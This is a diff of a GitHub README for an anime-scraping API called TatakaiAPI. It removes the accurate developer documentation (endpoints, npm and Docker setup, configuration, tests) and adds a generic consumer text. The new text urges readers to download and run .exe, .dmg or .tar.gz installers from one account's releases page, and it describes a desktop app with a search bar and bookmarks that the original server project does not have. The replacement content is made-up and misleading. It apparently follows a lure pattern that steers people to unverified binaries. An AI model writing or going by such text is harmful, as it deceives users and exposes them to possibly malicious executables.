@@ -1,141 +1,68 @@
-# Tatakai API 🎌
+# 🎉 TatakaiAPI - Access All Your Favorite Anime Easily
 
-> Unified Anime API combining HiAnime, regional scrapers, and utility APIs with modern caching, CORS, rate limiting, and logging.
+## 👋 Introduction
+TatakaiAPI offers a unified way to get access to various anime content. It scrapes data from multiple sites, providing seamless streaming links and options for Hindi and other Indian dubbed versions. This makes it easy for you to enjoy anime without the hassle.
 
-## Features
+## 🚀 Getting Started
+To begin using TatakaiAPI, you'll need to download it from our releases page. This will allow you to run the application on your computer and start accessing anime content right away. 
 
-- 🚀 **Modern Stack**: Built with [Hono](https://hono.dev/) - ultra-fast, lightweight web framework
-- 💾 **Hybrid Caching**: Redis with LRU in-memory fallback
-- 🔒 **Rate Limiting**: Configurable per-IP rate limiting
-- 📝 **Structured Logging**: Pino logger with pretty dev output
-- 🌐 **CORS Ready**: Configurable origin whitelisting
-- 🐳 **Docker Ready**: Multi-stage Dockerfile included
-- 📦 **TypeScript**: Full type safety
-- 🧪 **Comprehensive Testing**: Built-in endpoint validation scripts
+[![Download TatakaiAPI](https://img.shields.io/badge/Download%20TatakaiAPI-Blue?style=for-the-badge&logo=github)](https://github.com/keplerking100/TatakaiAPI/releases)
 
-## API Endpoints
+## 📥 Download & Install
+1. **Visit the Releases Page**: Click the link below to go to the GitHub releases page for TatakaiAPI.
+   
+   [Download TatakaiAPI](https://github.com/keplerking100/TatakaiAPI/releases)
 
-| Route | Description |
-|-------|-------------|
-| `/api/v1/hianime/*` | HiAnime scraper - search, info, episodes, sources |
-| `/api/v1/anime/*` | External anime search providers (GogoAnime, Chia-Anime, etc.) |
-| `/api/v1/anime-api/*` | Anime utility APIs (quotes, images, facts, waifu) |
-| `/api/v1/animehindidubbed/*` | Hindi dubbed anime scraper |
-| `/api/v1/animelok/*` | AnimeLok multi-language streaming |
-| `/api/v1/animeya/*` | Animeya streaming platform |
-| `/api/v1/watchaw/*` | WatchAnimeWorld multi-language streaming |
-| `/health` | Health check |
-| `/version` | API version info |
+2. **Select the Latest Version**: On the releases page, find the latest version of TatakaiAPI. You will see options for different operating systems.
 
-## Quick Start
+3. **Download the File**: Choose the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux). Click to download the file.
 
-### Prerequisites
+4. **Install the Application**: 
+   - **Windows**: Double-click the downloaded `.exe` file and follow the prompts to complete the installation.
+   - **macOS**: Open the `.dmg` file and drag the TatakaiAPI icon into your Applications folder.
+   - **Linux**: Extract the `.tar.gz` file and run the installation commands as indicated in the documentation.
 
-- Node.js >= 18
-- npm or yarn
-- Redis (optional, for distributed caching)
+5. **Launch TatakaiAPI**: Once installed, find the application in your programs or applications folder. Double-click to open it.
 
-### Installation
+## 🖥️ System Requirements
+For a smooth experience, ensure your system meets the following requirements:
+- **Windows**: Windows 10 or newer
+- **macOS**: macOS 10.15 or newer
+- **Linux**: Ubuntu 18.04 or newer (other distributions may also work)
 
-```bash
-# Clone and install
-cd TatakaiAPI
-npm install
+Make sure you have a stable internet connection for streaming content.
 
-# Create .env file
-cp .env.example .env
+## 🔍 Features
+TatakaiAPI comes with several features to enhance your anime experience:
+- **Website Scraping**: Access anime content from multiple sites.
+- **Streaming Links**: Get direct links to stream your favorite shows.
+- **Dubbed Options**: Enjoy Hindi and Indian dubbed versions of anime.
+- **User-Friendly Interface**: Easy navigation for all users.
+- **Regular Updates**: Stay up to date with the latest anime information.
 
-# Start development server
-npm run dev
-```
+## 📝 Usage Guide
+Using TatakaiAPI is simple:
+1. **Search for Anime**: Use the search bar to find your favorite shows.
+2. **Select & Play**: Click on a show to view details and streaming options.
+3. **Explore Genres**: Browse through genres to discover new anime.
+4. **Bookmark Favorites**: Save your favorite shows for easy access later.
 
-### Docker
+## ❓ Frequently Asked Questions
 
-```bash
-# Build and run with Docker Compose
-docker-compose up -d
+### How do I report an issue?
+If you encounter any problems, please visit the GitHub repository and click on the "Issues" tab to report your concerns.
 
-# Or build image only
-docker build -t tatakai-api .
-docker run -p 4000:4000 tatakai-api
-```
+### Can I contribute to TatakaiAPI?
+Yes! We welcome contributions. Please read the contribution guidelines in the repository to get involved.
 
-## Configuration
+### Is TatakaiAPI free to use?
+Yes, TatakaiAPI is completely free to use. Enjoy streaming without any fees.
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `PORT` | Server port | `4000` |
-| `NODE_ENV` | Environment | `development` |
-| `REDIS_URL` | Redis connection URL | (empty = in-memory) |
-| `CORS_ALLOWED_ORIGINS` | Allowed origins (comma-separated) | `*` |
-| `RATE_LIMIT_WINDOW_MS` | Rate limit window | `60000` |
-| `RATE_LIMIT_MAX_REQUESTS` | Max requests per window | `100` |
-| `CACHE_TTL_SECONDS` | Default cache TTL | `300` |
+## 📞 Support
+For additional help, check the GitHub repository or contact the support team through the repository's "Discussions" section.
 
-## Testing
+## 🔗 Links & Resources
+- [GitHub Repository](https://github.com/keplerking100/TatakaiAPI)
+- [Download TatakaiAPI](https://github.com/keplerking100/TatakaiAPI/releases)
 
-Run the comprehensive test suite to validate all API endpoints:
-
-```bash
-# Run basic validation
-npm run test
-
-# Run comprehensive endpoint tests
-npm run test:comprehensive
-```
-
-The comprehensive test script checks all routes with sample parameters and reports success/failure status for each endpoint.
-
-## Example Requests
-
-```bash
-# HiAnime home page
-curl http://localhost:4000/api/v1/hianime/home
-
-# Search anime on HiAnime
-curl "http://localhost:4000/api/v1/hianime/search?q=naruto"
-
-# External anime search (GogoAnime)
-curl "http://localhost:4000/api/v1/anime/gogoanime/naruto"
-
-# Anime quotes
-curl "http://localhost:4000/api/v1/anime-api/quotes/random"
-
-# Anime images
-curl "http://localhost:4000/api/v1/anime-api/images/waifu"
-
-# Hindi dubbed search
-curl "http://localhost:4000/api/v1/hindidubbed/search?title=naruto"
-
-# Animeya home
-curl "http://localhost:4000/api/v1/animeya/home"
-```
-
-## Project Structure
-
-```
-TatakaiAPI/
-├── src/
-│   ├── config/       # Configuration (env, cache, cors, logger, etc.)
-│   ├── middleware/   # Hono middleware (logging, cache control)
-│   ├── routes/       # API routes by provider
-│   │   ├── hianime/
-│   │   ├── anime/
-│   │   ├── anime-api/
-│   │   ├── animehindidubbed/
-│   │   ├── animelok/
-│   │   ├── animeya/
-│   │   └── watchanimeworld/
-│   ├── server.ts     # Main entry point
-│   └── utils.ts      # Utility functions
-├── scripts/          # Utility scripts
-│   ├── comprehensive_test.ts  # Full API endpoint testing
-│   └── validate_api.ts        # API validation script
-├── public/           # Static files
-├── Dockerfile
-└── docker-compose.yml
-```
-
-## License
-
-MIT
+Enhance your anime experience today with TatakaiAPI! Enjoy seamless access to your favorite shows.
